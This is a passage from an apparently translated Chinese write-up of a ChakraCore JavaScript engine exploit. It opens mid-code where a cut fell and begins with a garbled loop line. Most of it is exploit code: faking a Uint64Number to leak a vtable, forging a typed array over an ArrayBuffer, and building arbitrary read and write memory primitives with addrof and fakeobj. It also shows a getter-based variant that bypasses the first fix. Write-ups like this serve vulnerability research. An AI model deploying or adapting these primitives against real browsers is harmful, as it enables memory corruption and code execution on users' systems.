    for (var i = 0; i )`分配时，数组达到一定的小尺寸将使其数据内联存储。这与我们的`addrof`原语相结合，使我们能够将任意数据放在内存中的已知位置
为了释放`vtable`内存，我们将使用以下策略：
  * 分配内联数组a
  * 分配一个内联数组b，使其在a之后
  * 伪造一个Uint64Number朝向a的末尾，以便保持该值的字段与b的vtable指针重叠
  * 在我们的假数字上调用parseInt，它会将vtable指针作为数字返回
为了伪造`Uint64Number`，我们只需要伪造一个Type，即`Uint64Number`，并且有些值设置为有效的地址
其逻辑如下：
    let a = new Array(16);
    let b = new Array(16);
    let addr = addrof(a);
    let type = addr + 0x68; // a[4]
    // type of Uint64
    a[4] = 0x6; 
    a[6] = lo(addr); a[7] = hi(addr);
    a[8] = lo(addr); a[9] = hi(addr);
    a[14] = 0x414141;
    a[16] = lo(type)
    a[17] = hi(type)
    // object is at a[14]
    let fake = fakeobj(i2f(addr + 0x90)) 
    let vtable = parseInt(fake);
    let uint32_vtable = vtable + offset;
    Now we have all we want to fake our typed array and this will just require some more dancing around pointers which is pretty similar
    type = new Array(16);
    type[0] = 50; // TypeIds_Uint32Array = 50,
    type[1] = 0;
    typeAddr = addrof(type) + 0x58;
    type[2] = lo(typeAddr); // ScriptContext is fetched and passed during SetItem so just make sure we don't use a bad pointer
    type[3] = hi(typeAddr);
    ab = new ArrayBuffer(0x1338);
    abAddr = addrof(ab);
    fakeObject = new Array(16);
    fakeObject[0] = lo(uint32_vtable);
    fakeObject[1] = hi(uint32_vtable);
    fakeObject[2] = lo(typeAddr); 
    fakeObject[3] = hi(typeAddr);
    fakeObject[4] = 0; // zero out auxSlots
    fakeObject[5] = 0;
    fakeObject[6] = 0; // zero out objectArray 
    fakeObject[7] = 0;
    fakeObject[8] = 0x1000;
    fakeObject[9] = 0;
    fakeObject[10] = lo(abAddr); 
    fakeObject[11] = hi(abAddr);
    address = addrof(fakeObject);
    fakeObjectAddr = address + 0x58;
    arr = fakeobj(i2f(fakeObjectAddr));
我们现在可以设计我们的读写原语如下：
    memory = {
        setup: function(addr) {
            fakeObject[14] = lower(addr); 
            fakeObject[15] = higher(addr);
        },
        write32: function(addr, data) {
            memory.setup(addr);
            arr[0] = data;
        },
        write64: function(addr, data) {
            memory.setup(addr);
            arr[0] = data & 0xffffffff;
            arr[1] = data / 0x100000000;
        },
        read64: function(addr) {
            memory.setup(addr);
            return arr[0] + arr[1] * BASE;
        }
    };
    print("[+] Reading at " + hex(address) + " value: " + hex(memory.read64(address)));
    memory.write32(0x414243444546, 0x1337);
### 绕过第一个修复
该错误最初是固定的，因此只需分配常规属性就不会使我们我们再触发错误。 但是，可以定义一个具有特殊处理的存取器，以便触发相同的情况。
我们需要改变的是`make_obj`和`opt`函数，如下所示：
    function make_obj() {
        let o = {};
        o.a1=0x4000;
        o.a2=0x4000;
        o.a3=0x4000;
        o.a4=0x4000;
        o.a5=0x4000;
        o.a6=0x4000;
        o.a7=0x4000;
        o.a8=0x4000;
        o.a9=0x4000;
        o.a10=0x4000;
        o.a11=0x4000;
        o.a12=0x4000;
        o.a13=0x4000;
        o.a14=0x4000;
        o.a15=0x4000;
        o.a16=0x4000;
        o.a17=0x4000;
        o.a18=0x4000;
        //o.a19=0x4000;
        //o.a20=0x4000;
        return o;
    }
    function opt(o) {
        o.__defineGetter__("accessor",() => {})
        o.a2; // set auxSlots as live
        o.pwn = 0x4000; // bug
    }
第一次修复后写入提交`e149067c8f1a80462ac77d863b9bfb0173d0ced3`
### 结论
在这篇文章中，我们能够了解如何使用有限的原语进行破坏攻击。 我希望大家喜欢这篇文章。 谢谢:)
    本文为翻译文章，文章来自：(https://phoenhex.re/2019-07-10/ten-months-old-bug)